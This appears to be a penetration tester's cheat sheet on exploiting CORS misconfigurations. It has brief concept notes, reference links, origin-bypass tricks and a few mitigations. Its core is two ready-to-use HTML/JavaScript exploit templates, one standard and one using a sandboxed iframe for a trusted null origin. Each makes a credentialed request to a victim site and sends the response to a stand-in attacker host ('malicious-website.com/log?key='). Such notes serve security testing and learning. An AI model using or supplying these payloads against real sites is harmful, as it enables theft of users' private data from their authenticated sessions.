Concepts : 

- CORS is a browser mechanism that enables a controlled access to resources outside the domain
- SoP => very restrictive and doesn't allow reading HTTP response information
- ACAO => Access-Control-Allow-Origin
- Access-Control-Allow-Credentials: true => means that requests can include cookies and will be processed in-session
- if the two headers are present the target is maybe vulnerable 
- pre-flight check


-----------------------------------------------

Links: 

- https://book.hacktricks.xyz/pentesting-web/cors-bypass
- https://www.corben.io/advanced-cors-techniques/
- https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397

-----------------------------------------------

Basic Templates :

1- normal one :

<html><script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
</script></html>



2- for trusted null origin : 

<html>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
</html>


-----------------------------------------------

Payloads : 

- add origin to the request and analyze the response 

-----------------------------------------------

Bypasses : 

- for a site named test.example.com :
	- hacktest.example.com
	- test.example.com.hack.com
	- bypass null origin with iframe

- exploit cors with xss if the trusted subdomain is vulnerable
- unicode bypass
- special chars that work with different browsers
- server side cache poisoning to xss to cors 



-----------------------------------------------


Migitations :

- Specifiy origins that are trusted 
- Avoid whitelisting Null and wildcards
- Dont rely on CORS only, as an attacker may launch an attack from a trusted origin 